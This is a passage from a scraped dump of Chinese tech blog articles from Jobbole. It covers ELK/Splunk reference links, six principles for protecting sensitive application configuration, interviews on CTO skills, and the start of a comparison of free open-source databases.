id=\"h2_14\">参考文档</h2>\n<p>ELK</p>\n<ul>\n<li>ElasticSearch 参考文档<a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html\" rel=\"nofollow\">https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html</a></li>\n<li>Github上收集的ElasticSearch相关开源软件列表 <a href=\"https://github.com/dzharii/awesome-elasticsearch\" rel=\"nofollow\">https://github.com/dzharii/awesome-elasticsearch</a></li>\n<li>知乎ElaticSearch专题 <a href=\"https://www.zhihu.com/topic/19899427/hot\" rel=\"nofollow\">https://www.zhihu.com/topic/19899427/hot</a></li>\n<li>中文书 <a href=\"https://github.com/chenryn/ELKstack-guide-cn\" rel=\"nofollow\">https://github.com/chenryn/ELKstack-guide-cn</a></li>\n<li>中文书 <a href=\"https://www.gitbook.com/book/wizardforcel/mastering-elasticsearch/details\" rel=\"nofollow\">https://www.gitbook.com/book/wizardforcel/mastering-elasticsearch/details</a></li>\n</ul>\n<p>Splunk</p>\n<ul>\n<li>Splunk 文档 <a href=\"https://docs.splunk.com/Documentation\" rel=\"nofollow\">https://docs.splunk.com/Documentation</a></li>\n<li>Splunk电子书 <a href=\"https://www.splunk.com/web_assets/v5/book/Exploring_Splunk.pdf\" rel=\"nofollow\">https://www.splunk.com/web_assets/v5/book/Exploring_Splunk.pdf</a></li>\n<li>Splunk 开发文档 <a href=\"http://dev.splunk.com/getstarted\" rel=\"nofollow\">http://dev.splunk.com/getstarted</a></li>\n<li>Splunk 应用市场 <a href=\"http://apps.splunk.com/\" rel=\"nofollow\">http://apps.splunk.com/</a></li>\n<li>Splunk 快速参考 <a href=\"https://www.splunk.com/content/dam/splunk2/pdfs/solution-guides/splunk-quick-reference-guide.pdf\" rel=\"nofollow\">https://www.splunk.com/content/dam/splunk2/pdfs/solution-guides/splunk-quick-reference-guide.pdf</a></li>\n</ul>\n<p>其它</p>\n<ul>\n<li><a href=\"https://www.upguard.com/articles/splunk-vs-elk\" rel=\"nofollow\">https://www.upguard.com/articles/splunk-vs-elk</a></li>\n<li><a href=\"https://db-engines.com/en/system/Elasticsearch%3BSplunk\" rel=\"nofollow\">https://db-engines.com/en/system/Elasticsearch%3BSplunk</a></li>\n<li><a href=\"https://www.searchtechnologies.com/blog/log-analytics-tools-open-source-vs-commercial\" rel=\"nofollow\">https://www.searchtechnologies.com/blog/log-analytics-tools-open-source-vs-commercial</a></li>\n<li><a href=\"http://www.learnsplunk.com/splunk-vs-elk-stack.html\" rel=\"nofollow\">http://www.learnsplunk.com/splunk-vs-elk-stack.html</a></li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111525\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111525votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111525\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://static.oschina.net/uploads/space/2017/0614/102156_SGGq_1450051.png"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/06/20", "praise_nums": 1}
{"tags": "配置,敏感信息,IT技术", "front_image_path": "full/8ff5816f9a677b8f84896761d3cc647a20a89304.jpg", "title": "应用敏感信息的 6 个配置原则", "url_object_id": "254aa5fa7bb31d4a1096b7a1925ac2ba", "url": "http://blog.jobbole.com/111412/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>无论是微服务还是单体应用，往往都会用到很多配置信息。在众多的配置信息中，有一类非常敏感，例如数据库账号密码、API Key、Service Account等。由于其特殊性，这些配置信息一旦泄露出去就很可能会使得应用遭到黑客攻击，例如数据库账号密码泄露可能导致“拖库”，甚至数据丢失。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/1-Sensitive-Information.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/1-Sensitive-Information-1024x642.jpg\" alt=\"\" width=\"700\" height=\"439\"></a></p>\n<p>在实际开发过程中，有几种常见的敏感配置信息管理方式，其优缺点各不相同，让我们依次来看看。</p>\n<h3>三种常见方式</h3>\n<h4>方式一：存储于独立的源代码仓库</h4>\n<p>将敏感配置信息硬编码到源代码中是一种古老的做法，由于其安全性难以得到保证，并且管理维护难度大，因此早已被开发团队摒弃。</p>\n<p>取而代之的是将敏感配置信息存储在配置文件中，并且将其单独放置于另外一个源代码仓库，在CI构建或者部署过程中，由CI从对应的源代码仓库中获取配置信息，然后将其打入应用包。</p>\n<p>这种方式最大的好处在于团队可以方便的对源代码仓库添加访问控制，但是缺点也是比较明显的：敏感配置信息并没有被加密存储，而且会被CI服务器缓存下来。</p>\n<h4>方式二：通过系统环境变量动态设置</h4>\n<p>这是一种另辟蹊径的做法，即把敏感配置信息设置到系统环境变量里，而不是存储在配置文件中。 这背后的逻辑是，既然敏感配置信息明文存储不够安全，就算加密存储也存在被破解的可能，那么就干脆不存储了。</p>\n<p>此种方式看上去非常巧妙但也隐含着一些问题。系统环境变量不可能凭空出现，必然需要有一个“主体”去设置它，而这个所谓的“主体”不外乎是人、CI或者脚本。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/2-CI-1.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/2-CI-1-1024x630.jpg\" alt=\"\" width=\"700\" height=\"431\"></a></p>\n<p>通过人来设置环境变量十分低效且易出错，而如果通过CI或者脚本来自动进行设置，看似提高了效率但敏感配置信息也就缓存在了CI中，或者作为脚本文件的一部分存储在了源代码仓库中。方式一中遇到的问题再次出现。</p>\n<h4>方式三：在运行时从配置中心动态获取</h4>\n<p>随着微服务、容器化变得越来越流行，配置中心几乎已经成为了这一领域里的标准配置。</p>\n<p>这种方式下，所有的配置信息（无论其敏感与否）都统一存储在配置中心，应用在启动或者运行过程中通过HTTPS从配置中心动态获取配置。由于所有的配置信息都集中在一起，并且由应用以自助的方式获取，因此非常便于维护管理。</p>\n<p>最为关键的是，采用这种方式既可以方便的实现敏感配置信息加密存储，又具备完善的权限控制能力，而且还能提供详细的日志记录。</p>\n<p>目前有不少工具或者框架可供开发团队选择，以搭建出这样的配置中心，常见的例如<a href=\"https://www.vaultproject.io/\">Hashicorp Vault</a> ，<a href=\"http://cloud.spring.io/spring-cloud-static/spring-cloud.html#_spring_cloud_config\">Spring Cloud Config</a>。如果是Cloud Native应用，还可以使用云平台提供的安全配置管理服务，例如微软Azure的<a href=\"https://azure.microsoft.com/en-us/services/key-vault/\">Key Vault</a>。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/3-security.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/3-security.jpg\" alt=\"\" width=\"960\" height=\"564\"></a></p>\n<p>然而配置中心的方式并非完美，依然有值得注意的地方。由于大量应用依赖于这个配置中心，因此单点失败的概率相比于其他几种方式会有所提高。此外，敏感配置信息会在网络上传输，因此传输过程的安全性也需要考虑在内，建议对其启用HTTPS。再者，配置中心也是众多微服务中的一个，考虑到它的特殊性，团队十分有必要对其添加适当的网络访问控制，例如仅允许从企业内部进行访问。</p>\n<h3>6个原则</h3>\n<p>各个团队所面临的实际情况很可能千差万别，并且本文所述的几种方式可能并非涵盖了所有的敏感配置信息管理方式。无论你的团队采用的是哪种方式，在使用过程中都可以参考下面这些原则，以保证敏感配置信息的安全性：</p>\n<ol>\n<li><strong>适度隔离：</strong>将敏感配置信息同源代码、普通配置信息隔离存储。</li>\n<li><strong>访问控制：</strong>通过白名单等方式，限制敏感配置信息的访问权限。</li>\n<li><strong>加密存储：</strong>将敏感配置信息加密后存储，仅在使用前临时解密，以进一步防止信息泄露。</li>\n<li><strong>安全传输：</strong>企业内网环境并非100%可信，通过HTTPS等加密手段以保证敏感配置信息的传输安全。</li>\n<li><strong>日志记录：</strong>尽量详细记录下针对配置信息的操作，以便于事后追查或者合规审查。</li>\n<li><strong>差别配置：</strong>不同的环境（例如生产环境，UAT环境，Dev环境等）使用不同的Credential，以避免“把鸡蛋放到一个篮子里”。</li>\n</ol>\n<h3>总结</h3>\n<p>应用往往需要用到配置信息，其中一些由于其特殊性会相比于其他配置信息更加敏感，它们需要被很好的保护起来以避免应用遭受黑客攻击。</p>\n<p>不同的敏感配置信息管理方式有着各自的特点。将敏感配置信息单独存储于源代码仓库中的方式常见于单体应用架构，与此同时配置中心在微服务架构下更为常见，而使用环境变量这种方式的团队也不在少数。</p>\n<p>没有绝对的好，也没有绝对的坏。团队采用哪种方式不是最重要的，关键在于是否遵循了一些基本的原则以保证敏感配置信息的安全性。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111412\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111412votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111412\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 60</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://insights.thoughtworkers.org/wp-content/uploads/2017/06/1-Sensitive-Information-1024x642.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/06/11", "praise_nums": 2}
{"tags": "职场,CTO", "front_image_path": "full/f6d320359bd1d91e96d39a3af2d631ae514c05e4.jpg", "title": "成就 CTO 的关键技能是什么？", "url_object_id": "fcd2bf26b8dce4d119880f97ae504caa", "url": "http://blog.jobbole.com/111351/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/young605867996\">Lada</a> 翻译，<a href=\"http://www.jobbole.com/members/oliverpp\">蒋生武</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.javacodegeeks.com/2015/12/key-skills-cto.html\">Florian Motlik</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fgbmit3k5nj20dv09d77c.jpg\" width=\"499\" height=\"337\"></p>\n<p>什么是成为 CTO 的关键技能？据 7 个受访者而言，CTO 的关键技能包括善解人意、了解如何提问，并且意识到并不是你的代码在挣钱。</p>\n<h3>Keen.io 的 CTO——Dan Kador</h3>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fga0z9hxbej20sg0eytaw.jpg\" width=\"690\" height=\"363\"></p>\n<p><span style=\"color: #ff0000;\"><strong>我第一个想到的就是毅力</strong></span>。这正是我要告诉那些想成为开发者的人，而且毅力能使你在这个岗位上坚持不懈。很多开发战斗都是沮丧的，你会敲着脑袋抗争着，最后在 40 个小时之后解决它。并且在这途中，你还要充满希望地寻求大量的帮助。所以你需要毅力，并且勇于寻求帮助。</p>\n<p>能推断二阶效应和三阶效应非常重要。例如，如果你帮助实施绩效评估，<span id=\"pos_placeholder\" style=\"width: 0px; height: 0px; margin: 0px; padding: 0px;\"></span>绩效评估的输入之一就是，“我们会综合考虑两到三个指标”。</p>\n<p><span id=\"0KSFindDIV\" class=\"KSFIND_CLASS_SELECT\"></span>就假设人们即刻就会敷衍这两到三个指标，因为人们就是这样工作的。那么这就是一阶效应，即这个指标会被敷衍。这样的话，什么是它的二阶效应呢？这件事是如何影响产品的？这件事是如何影响文化的？但愿，你可以得到三阶效应。二阶效应和三阶效应都是非常重要的。</p>\n<h3>Zendesk 的 CTO——Morten Primdahl</h3>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fga0z9sc8wj20sg0eywgj.jpg\" width=\"690\" height=\"363\"></p>\n<p class=\"\"><span style=\"color: #ff0000;\"><strong>我认为创造力在其中应该排在前位</strong>。</span>你不得不在（耗时长的良好解决方案）和（能短时间内完成的解决方案）之间抉择，在创业时期，经常碰到这种事。我们中没人喜欢留下技术债务，但有时候，这是我们要面对的现实。在寻找解决方案上具有创造性，不用回头再给你十倍的痛苦，从长远来看，这是非常重要的。</p>\n<p>你不会愿意牺牲技术上正确的做事方式。不要被太多的教条主义思想束缚。你要务实地、协同地工作；意识到挣钱的并不是你的代码，而是产品。那些通常相同的事情，并非总是一样。</p>\n<h3>Indico 的 CTO——Madison May</h3>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fga0zalpcsj20sg0ey40s.jpg\" width=\"690\" height=\"363\"></p>\n<p><strong><span style=\"color: #ff0000;\">我认为，听取团队其余成员的意见，以及收集他们的反馈非常重要</span></strong>。我的主要任务之一就是整合意见和信息。通常，不是我自己做决定，而是最有资格的人做决定。我的角色则是整合反馈，并且了解什么会是团体认为最优的解决方案。</p>\n<p>同样重要的是，要很快地明白：<span style=\"color: #ff0000;\"><strong>生产力不是通过技术输出来衡量的</strong></span>。通过计算代码输出来衡量 CTO 的生产力，是一种非常糟糕的度量方式。对我来说，生产力意味着使人们不间断地运作，以及帮着把工作分解成容易处理的组成部分。同时，<span style=\"color: #ff0000;\"><strong>沟通是关键</strong></span>。我的工作就是能向人们传达我们公司的技术观点，这些人也许没有技术背景。学习跨越语言障碍是艰难的，尤其是当你处于像机器学习这样的行业里。学习在交流时，用日常用语表达一些相同的概念，也至关重要。</p>\n<p>对于任何的新想法来说，交流/沟通通常都是一大障碍。</p>\n<p>我发现在软件架构和管理运营公司之间有很多类似的东西。架构上的很多危险信号，和公司中的危险信号很类似。</p>\n<p>就像面条代码——有很多组件负责一个功能，而不是每个组件负责一个行为。这是我们在 indico 早期时，感受到的痛苦。那时候并不清楚谁负责公司的哪个方面。我们花了一段时间，才弄清楚如何在整个组织中高效安排任务，并确保由合适的人做出决策。在每次决策时让所有人都拥有发言权，不一定会促成一个好的决策（民/主并不一定带来好决策）。它只会促成混乱。</p>\n<p>冗余原则上也有相似之处。我们一直在知识转移上努力，因此没有知识是停留在一个人的脑子里的。知识应该分布在我们的组织内，以便我们可以在某人缺席的情况下继续运行。</p>\n<h3>Heroku Postgres 的创始开发者——Peter van Hardenberg</h3>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fga0zbhmf5j20sg0eywgm.jpg\" width=\"690\" height=\"363\"></p>\n<p><strong><span style=\"color: #ff0000;\">知道如何提问</span></strong>。通常，第一个问题总是“你想解决的是什么问题？”如果你不了解你想解决的是什么问题，无论是在技术上、产品上，或人力上的问题，那么即使你完成了目标，你仍然不会懂。很多人对一次实现，或是一个想法感到兴奋；但在它们执行之前，要确保已经记录了已解决的问题和未解决的问题。</p>\n<p>一个可能较好的例子是：如果你正在构建一个新功能去缩短登录时间，也知道自己正在构建一个新的登录页面。但为什么需要构建它呢？你想减少注册时的冲突吗？在任务结束时，你是如何知道它完成了的呢？你必须确保，无论何时都知道着手所做之事的目的。它真的会有用吗？用户会使用它吗？它解决了用户什么问题？</p>\n<p><span style=\"color: #ff0000;\"><strong>其次是同理心</strong></span>。你需要对用户、团队成员、管理和你的报告具有同理心。根本上来说，软件难，而人更难。并且是人去制作软件，因此无论你是工程师、产品经理或管理者，最终要解决的是人的问题。</p>\n<h3>PillPack 的 CTO——Elliot Cohen</h3>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fga0zc8ecoj20sg0eywg6.jpg\" width=\"690\" height=\"363\"></p>\n<p>成为一个优秀的技术合伙人，你需要知道哪些？对于这个问题，我不认为存在任何的“万能”答案。我能说的是，我认为每个创始人都需要，不管在技术上、或非技术上，都有深层次的认知意识。</p>\n<p>你要从身边尽快建立一个团队的唯一方法就是，严苛地了解自己的优点和缺点，并且确保你周围有人可以填补你的短板。没有完人，但可以有完美的团队。</p>\n<h3>Boston Ruby 和 Go 用户组的协办者——Johnny Boursiquot</h3>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fga0zcb6szj20sg0eyjt8.jpg\" width=\"690\" height=\"363\"></p>\n<p>和我共事的开发人员，无论是年轻的、年老的、新入行的还是有经验的，对他们而言，“社群”意味着所有权，而所有权赋予大家责任，让我们成为保持热情并充满活力的人。让我们永不满足于现状。</p>\n<h3>Exercism.io 的创办者——Katrina Owen</h3>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fga0zcz7wyj20sg0eyjtu.jpg\" width=\"690\" height=\"363\"></p>\n<p>我们一直工作，几乎从未松懈。尽管有大量研究表明，长时间工作会使生产力一落千丈，但我们的行为还是折射出「工作时间更长会，结果会更好」。</p>\n<p>我希望这个行业能有更多的休息，或者只是做点其他的事。我完全赞成努力工作，但无须如此不遗余力。</p>\n<p>我认为，我们需要让大脑跳出线性的任务导向模式，转换到另一模式，这种模式能找出惊人的解决方案和并非显而易见的方法。如果不花足够的时间，把我们所知的不同事物之间的点联系起来，即使我们获得大量的知识，也只能培育极少的智慧。</p>\n<p>合理的假期，我们都值得拥有！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111351\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111351votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111351\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">Lada</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/B77EEB9D520DE9C7BD42E89DC348FEC7/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            希望了解更多互联网、创业管理、创新思维、前沿技术和设计的知识。渐进明细，持续改进。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/young605867996\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/young605867996/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://littlejanery.blog.163.com/\"><i class=\"fa fa-link\"></i></a> <a title=\"QQ：605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：yao605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fgbmit3k5nj20dv09d77c.jpg"], "fav_nums": 5, "comment_nums": 0, "create_date": "2017/06/06", "praise_nums": 1}
{"tags": "数据库,IT技术", "front_image_path": "full/4dd191bc3100b9ab88a866fbfb75f2420ef4be82.jpg", "title": "7 个开源数据库利弊对比，哪款才最适合你？", "url_object_id": "29eba19f00c6c577fb1848f64b466003", "url": "http://blog.jobbole.com/111379/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://blog.capterra.com/free-database-software/\">capterra</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/top-7-free-database-software?print\">开源中国</a>   </div><p>我喜欢披萨。</p>\n<p>开玩笑啦。我喜欢披萨。特别是如果它是免费的时候。</p>\n<p>我甚至喜欢看起来像免费披萨的东西。就在某一天，一个包裹来了我的邮箱中，它被包在一个披萨盒子里面。我要给 Etsy 店主五星好评。我保存了这个箱子。这比在披萨店中味道好多了。</p>\n<p>免费比萨是我在校园里最喜欢的东西之一。在校园里的新俱乐部或组织的广告宣传单的角落里总会提到集会上会提供免费披萨。这样我就会在那里， 因为呃（你懂得）</p>\n<p>不幸的是，正如我所学到的，有个无尽的迷宫被称为成年，披萨并不总是免费的。免费奶酪的甜美味道已经过去很久了。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/2367a0bbaec8a0e361962dd3c6845afc.png\"></p>\n<p>但在数据库管理软件的世界里并非如此，其中免费的数据库软件和开源解决方案与番茄酱和香蒜酱的搭配一样丰富、令人着迷。</p>\n<p>因为当 IT 部门只有微薄预算下运行时，降低成本对于保持业务和保持 IT 业务盈利是非常重要的。每个人都喜欢免费的东西。</p>\n<p>这对我来说同样很诱人。</p>\n<p>所以，让我们回到对你影响重大的大学时代，当世界像融化的芝士一样自由而梦幻的时候，看看这七个绝妙的免费数据库软件和开源的DBM解决方案，让你的部门保持正常预算。</p>\n<h2><a href=\"http://www.cubrid.org/\" target=\"_blank\" rel=\"nofollow\">CUBRID</a></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/9c766d386825f17349d5af8221c34355.jpg\"></p>\n<p>CUBRID 是一个很好的免费开源选择，专门针对 Web 应用程序进行优化，当复杂的 Web 服务需要处理大量数据并生成巨大的并发请求时，CUBRID 非常有用。这个解决方案是用 C 写的。</p>\n<h3>优点：</h3>\n<ul>\n<li>多粒度锁定</li>\n<li>在线备份</li>\n<li>用于开发语言的 GUI 工具和驱动程序：\n<ul>\n<li>JDBC, PHP, Python, Perl, 和 Ruby.</li>\n</ul>\n</li>\n<li>自动故障切换功能，全天候在线网络服务</li>\n<li>支持本机 DB 分片，实现水平/垂直可扩展性\n<ul>\n<li>大型系统通过多个数据库实例划分数据</li>\n</ul>\n</li>\n<li>数据库复制和事务一致性</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>不适用于苹果系统</li>\n<li>没有脚本调试器</li>\n<li>手册仅限英文或韩文</li>\n<li>他们论坛上的讨论往往是过时的（大部分来自几年前）</li>\n</ul>\n<h2><a href=\"http://www.firebirdsql.org/en/start/\" target=\"_blank\" rel=\"nofollow\"><strong>Firebird</strong></a></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/d9d4eed08abc7faaaeaf347b9592c14f.jpg\"></p>\n<p>该关系型数据库自1981年以来一直（以各种名称）用于生产系统，并具有许多ANSI SQL标准功能。 Firebird能够在Linux，Windows和各种Unix平台上运行。</p>\n<h3>优点</h3>\n<ul>\n<li>Trace API 用于实时监控</li>\n<li>Windows 信任的身份验证</li>\n<li>四个支持的架构：\n<ul>\n<li>SuperClassic, Classic, SuperServer, 和 Embedded</li>\n</ul>\n</li>\n<li>多种开发工具：\n<ul>\n<li>商业工具：FIBPlus 和 IBObjects</li>\n</ul>\n</li>\n<li>自动扫描选项用于清理数据库</li>\n<li>数据库触发器和存储过程的事件通知</li>\n<li>Firebird 的大型全球社区提供免费支持</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>不包括集成复制支持（仅作为附件）</li>\n<li>缺少临时表格和与其他数据库系统的集成</li>\n<li>与其他操作系统解决方案相比，缺乏 Windows 信任认证</li>\n</ul>\n<h2><a href=\"https://mariadb.org/\" target=\"_blank\" rel=\"nofollow\">MariaDB</a></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/9958a145ed25d38fed0dc84030436f90.jpg\"></p>\n<p>MariaDB 由 MySQL 的原创人员开发，并被维基百科，Facebook 甚至 Google 等技术巨头使用。 MariaDB 是一种可为 MySQL 提供插件替换功能的数据库服务器。开发人员的首要关注点是安全性，在每个版本发布时，开发人员还会合并所有 MySQL 的安全修补程序，并在需要时对其进行增强。</p>\n<h3>优点：</h3>\n<ul>\n<li>高可扩展性，易于集成</li>\n<li>能够实时访问</li>\n<li>具备 MySQL 的核心功能（MariaDB 是 MySQL 的替代方案）</li>\n<li>备用存储引擎，服务器优化和补丁</li>\n<li>MariaDB 已经运作了20多年的广泛知识库</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>缺少密码复杂性插件</li>\n<li>没有 memcached 界面</li>\n<li>没有优化器跟踪</li>\n</ul>\n<h2><strong><a href=\"https://www.mongodb.com/\" target=\"_blank\" rel=\"nofollow\">MongoDB</a></strong></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/188d85be4bda68af0100fc92852b427d.gif\"></p>\n<p>MongoDB 创立于2007年，被称为“数据库巨头”。 由 DoubleClick, ShopWiki 和 Gilt Groupe 背后的开发人员开发，并由 Fidelity Investments， Goldman Sachs Group，Inc.，Intel Capital 这些机构投资。自成立以来，MongoDB 